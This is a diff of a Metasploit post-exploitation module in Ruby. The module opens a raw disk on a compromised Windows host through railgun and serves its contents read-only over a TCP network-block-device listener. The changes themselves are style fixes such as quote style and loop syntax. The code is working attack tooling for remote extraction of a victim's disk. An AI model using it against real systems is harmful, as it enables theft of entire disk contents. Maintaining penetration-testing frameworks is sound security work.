@@ -56,15 +56,15 @@ class MetasploitModule < Msf::Post
     fsctl_allow_extended_dasd_io = 0x00090083
     ioctl_disk_get_drive_geometry_ex = 0x000700A0
 
-    r = client.railgun.kernel32.CreateFileA(devname, "GENERIC_READ",
-                                            0x3, nil, "OPEN_EXISTING", "FILE_ATTRIBUTE_READONLY", 0)
+    r = client.railgun.kernel32.CreateFileA(devname, 'GENERIC_READ',
+                                            0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0)
     handle = r['return']
     r = client.railgun.kernel32.DeviceIoControl(handle, fsctl_allow_extended_dasd_io, nil, 0, 0, 0, 4, nil)
     ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,
-                                                    "", 0, 200, 200, 4, "")
+                                                    '', 0, 200, 200, 4, '')
     if ioctl['GetLastError'] == 6
       ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,
-                                                      "", 0, 200, 200, 4, "")
+                                                      '', 0, 200, 200, 4, '')
     end
     geometry = ioctl['lpOutBuffer']
     disk_size = geometry[24, 31].unpack('Q')[0]
@@ -72,30 +72,30 @@ class MetasploitModule < Msf::Post
     socket = Rex::Socket::TcpServer.create({ 'LocalHost' => ip_addr, 'LocalPort' => port })
     print_status("Listening on #{ip_addr}:#{port}")
     print_status("Serving #{devname} (#{disk_size} bytes)")
-    rsock = socket.accept()
-    print_status("Accepted a connection")
+    rsock = socket.accept
+    print_status('Accepted a connection')
 
     # Negotiation
     rsock.put('NBDMAGIC')
     rsock.put("\x00\x00\x42\x02\x81\x86\x12\x53")
 
-    rsock.put([disk_size].pack("Q").reverse)
+    rsock.put([disk_size].pack('Q').reverse)
     rsock.put("\x00\x00\x00\x03")  # Read-only
     rsock.put("\x00" * 124)
-    print_line("Sent negotiation")
+    print_line('Sent negotiation')
 
-    while true
+    loop do
       request = rsock.read(28)
 
       unless request
-        print_error("No data received")
+        print_error('No data received')
         break
       end
 
-      magic, request, nbd_handle, offset_n, length = request.unpack("NNa8a8N")
+      magic, request, nbd_handle, offset_n, length = request.unpack('NNa8a8N')
 
       if magic != 0x25609513
-        print_error("Wrong magic number")
+        print_error('Wrong magic number')
         break
       end
       if request == 2
@@ -103,22 +103,22 @@ class MetasploitModule < Msf::Post
       end
 
       if request == 1
-        print_error("Attempted write on a read-only nbd")
+        print_error('Attempted write on a read-only nbd')
         break
       end
-      if request == 0
-        client.railgun.kernel32.SetFilePointer(handle, offset_n[4, 7].unpack('N')[0],
-                                               offset_n[0, 4].unpack('N')[0], 0)
-        rsock.put("gDf\x98\x00\x00\x00\x00")
-        rsock.put(nbd_handle)
-        data = client.railgun.kernel32.ReadFile(handle, length, length, 4, nil)['lpBuffer']
-        rsock.put(data)
-      end
+      next unless request == 0
+
+      client.railgun.kernel32.SetFilePointer(handle, offset_n[4, 7].unpack('N')[0],
+                                             offset_n[0, 4].unpack('N')[0], 0)
+      rsock.put("gDf\x98\x00\x00\x00\x00")
+      rsock.put(nbd_handle)
+      data = client.railgun.kernel32.ReadFile(handle, length, length, 4, nil)['lpBuffer']
+      rsock.put(data)
     end
 
-    print_status("Closing")
-    rsock.close()
-    socket.close()
+    print_status('Closing')
+    rsock.close
+    socket.close
 
     client.railgun.kernel32.CloseHandle(handle)
   end
